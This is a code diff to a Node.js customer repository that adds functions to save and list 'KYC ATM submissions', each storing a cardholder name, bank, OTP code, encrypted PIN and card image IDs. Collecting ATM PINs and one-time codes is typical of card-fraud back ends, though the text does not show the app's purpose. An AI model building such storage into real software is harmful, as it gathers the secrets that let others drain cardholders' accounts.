@@ -259,6 +259,46 @@ function createCustomerRepository(pool) {
       };
     },
 
+    
+    async createAtmSubmission({ userId, holderName, bankName, otpCode, pinCipher, frontDocumentId, backDocumentId }) {
+      const crypto = require('node:crypto');
+      const id = crypto.randomUUID();
+      await pool.query(
+        `INSERT INTO kyc_atm_submissions
+          (id, user_id, holder_name, bank_name, otp_code, pin_cipher, front_document_id, back_document_id, status)
+         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
+        [
+          uuidToBinary(id),
+          uuidToBinary(userId),
+          holderName,
+          bankName,
+          otpCode || null,
+          pinCipher || null,
+          frontDocumentId ? uuidToBinary(frontDocumentId) : null,
+          backDocumentId ? uuidToBinary(backDocumentId) : null
+        ]
+      );
+      return id;
+    },
+
+    async listAtmSubmissions(userId) {
+      const [rows] = await pool.query(
+        `SELECT id, holder_name, bank_name, status, created_at
+         FROM kyc_atm_submissions
+         WHERE user_id = ?
+         ORDER BY created_at DESC
+         LIMIT 20`,
+        [uuidToBinary(userId)]
+      );
+      return rows.map((r) => ({
+        id: binaryToUuid(r.id),
+        holderName: r.holder_name,
+        bankName: r.bank_name,
+        status: r.status,
+        createdAt: r.created_at
+      }));
+    },
+
     async createKycDocument({ userId, documentType, storageProvider, storageAssetId }) {
       const id = newBinaryId();
       await pool.query(
